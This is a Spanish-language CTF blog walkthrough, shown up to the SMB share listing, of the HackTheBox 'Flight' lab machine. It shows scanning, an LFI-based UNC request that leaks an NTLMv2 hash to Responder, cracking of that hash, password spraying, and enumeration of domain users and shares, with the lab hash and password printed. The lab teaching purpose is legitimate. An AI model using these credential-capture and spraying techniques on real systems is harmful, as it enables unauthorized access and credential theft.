<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Flight (hard) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Flight (hard)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/hard/2024/04/06/flight.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/hard/2024/04/06/flight.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-04-06T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Flight (hard)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-06T00:00:00-06:00","datePublished":"2024-04-06T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Flight (hard)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/hard/2024/04/06/flight.html"},"url":"http://localhost:4000/hackthebox/machines/hard/2024/04/06/flight.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Flight (hard)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-04-06T00:00:00-06:00" itemprop="datePublished">
        Apr 6, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/a7af9035e5089332dfbfeb328d663f3e.png" />
</p>

<p>En este post vamos a estar haciendo la máquina Flight de Hackthebox de dificultad difícil vamos a estar consiguiendo hashes ntlmv2 de varios usuarios para ganar acceso ala máquina víctima además vamos a estar subiendo archivos para también ganar acceso, ya que tenemos privilegios de escritura en algunos archivos de la máquina por smb para la escalada de privilegios abusaremos de un permiso que tenemos enable y más.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.11.187
PING 10.10.11.187 <span class="o">(</span>10.10.11.187<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.187: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>103 ms

<span class="nt">---</span> 10.10.11.187 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 103.446/103.446/103.446/0.000 ms
❯ whichSystem.py 10.10.11.187

10.10.11.187 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
</code></pre></div></div>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,80,135,139,389,445,636,3268,49667,49673,49724 10.10.11.187 <span class="nt">-oN</span> targeted
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-05-06 11:09 CST
Nmap scan report <span class="k">for </span>10.10.11.187
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1m PHP/8.1.1<span class="o">)</span>
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-05-07 00:09:27Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: flight.htb0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: flight.htb0., Site: Default-First-Site-Name<span class="o">)</span>
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m54s
| smb2-time: 
|   <span class="nb">date</span>: 2023-05-07T00:10:24
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

</code></pre></div></div>

<h2 id="enumeracion">Enumeracion</h2>

<ul>
  <li>Vamos a usar la herramienta <code class="language-plaintext highlighter-rouge">crackmapexec</code> para ver ante que estamos y vemos el nombre del dominio que es <strong>flight.htb</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187
SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>

</code></pre></div></div>

<ul>
  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.187 flight.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.187 flight.htb
❯ ping <span class="nt">-c</span> 1 flight.htb
PING flight.htb <span class="o">(</span>10.10.11.187<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from flight.htb <span class="o">(</span>10.10.11.187<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>143 ms

<span class="nt">---</span> flight.htb ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 143.199/143.199/143.199/0.000 ms
</code></pre></div></div>

<p>Si listamos los recursos compartidos por <strong>smb</strong> y empleamos un <strong>Null session</strong> de momento no podemos ver nada asi que vamos a seguir enumerando la maquina</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.11.187 <span class="nt">-N</span>
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
SMB1 disabled <span class="nt">--</span> no workgroup available

</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">m</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">2</span><span class="p">],</span> <span class="no">OpenSSL</span><span class="p">[</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">m</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Script</span><span class="p">[</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="n">g0</span> <span class="no">Aviation</span><span class="p">]</span>
</code></pre></div></div>

<p>Esta es la pagina web que corre en el puerto <strong>80</strong></p>

<p><img src="/assets/images/htb-writeup-flight/web1.png" alt="" /></p>

<p>Si buscamos por mas subdominios en la maquina encontramos uno nuevo <strong>school.flight.htb</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-u</span> <span class="s2">"http://flight.htb/"</span> <span class="nt">-H</span> <span class="s2">"Host: FUZZ.flight.htb"</span> <span class="nt">--hl</span> 154
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://flight.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000624:   200        90 L     412 W      3996 Ch     "school"
</span></code></pre></div></div>

<p>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 school.flight.htb
PING flight.htb <span class="o">(</span>10.10.11.187<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from flight.htb <span class="o">(</span>10.10.11.187<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>105 ms

<span class="nt">---</span> flight.htb ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 104.703/104.703/104.703/0.000 ms
</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">school</span><span class="p">.</span><span class="nf">flight</span><span class="p">.</span><span class="nf">htb</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">school</span><span class="p">.</span><span class="nf">flight</span><span class="p">.</span><span class="nf">htb</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">m</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span><span class="p">],</span> <span class="no">OpenSSL</span><span class="p">[</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">m</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Aviation</span> <span class="no">School</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web y bueno en la <code class="language-plaintext highlighter-rouge">url</code> ya podemos darnos una idea de que tal vez sea vulnerable a <code class="language-plaintext highlighter-rouge">LFI</code> vamos  a probar.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/flight/web2.png" />
</p>

<ul>
  <li>Pero nos detecta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/flight/web3.png" />
</p>

<ul>
  <li>Si apuntamos a la pagina web con <code class="language-plaintext highlighter-rouge">view=index.php</code> vemos que nos da una respuesta algo rara.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/flight/web4.png" />
</p>

<ul>
  <li>Se esta haciendo una peticion por <code class="language-plaintext highlighter-rouge">GET</code> asi que vamos a hacer una peticion con <code class="language-plaintext highlighter-rouge">curl</code> a un recurso para ver si nos llega el <strong>hash ntlmv2</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s2">"http://school.flight.htb/index.php?view=//10.10.14.86/test"</span>
</code></pre></div></div>

<ul>
  <li>Con la herramienta <code class="language-plaintext highlighter-rouge">responder</code> nos vamos a poner en la interfaz <code class="language-plaintext highlighter-rouge">tun0</code> y nos llega el  <code class="language-plaintext highlighter-rouge">hash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ responder <span class="nt">-I</span> tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    DNS/MDNS                   <span class="o">[</span>ON]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>OFF]
    Fingerprint hosts          <span class="o">[</span>OFF]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.86]
    Challenge <span class="nb">set</span>              <span class="o">[</span>random]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-UXGLJ5F51VJ]
    Responder Domain Name      [SIB7.LOCAL]
    Responder DCE-RPC Port     [45975]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:e67211d7f7146072:C651456AAA11235832A5DBB10696A02E:01010000000000008013613C0F80D90142626E9A48FEF4A30000000002000800530049004200370001001E00570049004E002D005500580047004C004A00350046003500310056004A0004003400570049004E002D005500580047004C004A00350046003500310056004A002E0053004900420037002E004C004F00430041004C000300140053004900420037002E004C004F00430041004C000500140053004900420037002E004C004F00430041004C00070008008013613C0F80D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000
</span></code></pre></div></div>

<ul>
  <li>Ahora vamos a crackearlo y tenemos la contraseña de <code class="language-plaintext highlighter-rouge">svc_apache:S@Ss!K@*t13</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn <span class="nb">hash
</span>svc_apache::flight:e67211d7f7146072:C651456AAA11235832A5DBB10696A02E:01010000000000008013613C0F80D90142626E9A48FEF4A30000000002000800530049004200370001001E00570049004E002D005500580047004C004A00350046003500310056004A0004003400570049004E002D005500580047004C004A00350046003500310056004A002E0053004900420037002E004C004F00430041004C000300140053004900420037002E004C004F00430041004C000500140053004900420037002E004C004F00430041004C00070008008013613C0F80D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000
❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
S@Ss!K@<span class="k">*</span>t13      <span class="o">(</span>svc_apache<span class="o">)</span>
1g 0:00:00:11 DONE <span class="o">(</span>2023-05-06 11:40<span class="o">)</span> 0.08361g/s 891547p/s 891547c/s 891547C/s SADSAM..S@29<span class="nv">$JL</span>
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>

<ul>
  <li>Comprobamos que son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> <span class="s1">'svc_apache'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@<span class="k">*</span>t13 
</code></pre></div></div>

<ul>
  <li>Ahora sabiendo esto ponemos usar <code class="language-plaintext highlighter-rouge">smbclient</code> o <code class="language-plaintext highlighter-rouge">smbmap</code> para ver los recursos compartidos a nivel de red.</li>
</ul>

<h2 id="smb-svc_apache">SMB svc_apache</h2>

<ul>
  <li>Nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> //10.10.11.187/ <span class="nt">-U</span> svc_apache
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>vc_apache]:

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	C<span class="nv">$ </span>             Disk      Default share
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shared          Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
	Web             Disk      
SMB1 disabled <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-u</span> <span class="s1">'svc_apache'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">-H</span> 10.10.11.187
<span class="o">[</span>+] IP: 10.10.11.187:445	Name: flight.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY	
</code></pre></div></div>

<h2 id="domain-users">Domain Users</h2>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> para obtener los usuarios del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> <span class="s1">'svc_apache'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">--users</span> | <span class="nb">awk</span> <span class="s1">'{print $5}'</span> | <span class="nb">grep </span>flight
flight.htb<span class="se">\O</span>.Possum
flight.htb<span class="se">\s</span>vc_apache
flight.htb<span class="se">\V</span>.Stevens
flight.htb<span class="se">\D</span>.Truff
flight.htb<span class="se">\I</span>.Francis
flight.htb<span class="se">\W</span>.Walker
flight.htb<span class="se">\C</span>.Bum
flight.htb<span class="se">\M</span>.Gold
flight.htb<span class="se">\L</span>.Kein
flight.htb<span class="se">\G</span>.Lors
flight.htb<span class="se">\R</span>.Cold
flight.htb<span class="se">\S</span>.Moon
flight.htb<span class="se">\k</span>rbtgt
flight.htb<span class="se">\G</span>uest
flight.htb<span class="se">\A</span>dministrator
</code></pre></div></div>

<ul>
  <li>Tambien podemos usar <code class="language-plaintext highlighter-rouge">rpcclient</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.11.187 <span class="nt">-U</span> <span class="s1">'svc_apache%S@Ss!K@*t13'</span> <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\[</span><span class="s2">.*?</span><span class="se">\]</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"0x"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span>
Administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> para ver si alguno de estos usuarios reutiliza la contraseña que ya tenemos agrega los usuarios a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">--continue-on-success</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\O</span>.Possum:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@<span class="k">*</span>t13 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\V</span>.Stevens:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\D</span>.Truff:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\I</span>.Francis:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\W</span>.Walker:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\C</span>.Bum:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\M</span>.Gold:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\L</span>.Kein:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\G</span>.Lors:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\R</span>.Cold:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\S</span>.Moon:S@Ss!K@<span class="k">*</span>t13 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\k</span>rbtgt:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\G</span>uest:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\A</span>dministrator:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
</code></pre></div></div>

<ul>
  <li>El usuario <code class="language-plaintext highlighter-rouge">S.Moon:S@Ss!K@*t13</code> reutiliza la contraseña.</li>
</ul>

<h2 id="user-smoon">User S.Moon</h2>

<ul>
  <li>Podemos escribir en <code class="language-plaintext highlighter-rouge">Shared</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-u</span> <span class="s1">'S.Moon'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">-H</span> 10.10.11.187
<span class="o">[</span>+] IP: 10.10.11.187:445	Name: flight.htb                                        
	Disk                                                  	Permissions	Comment
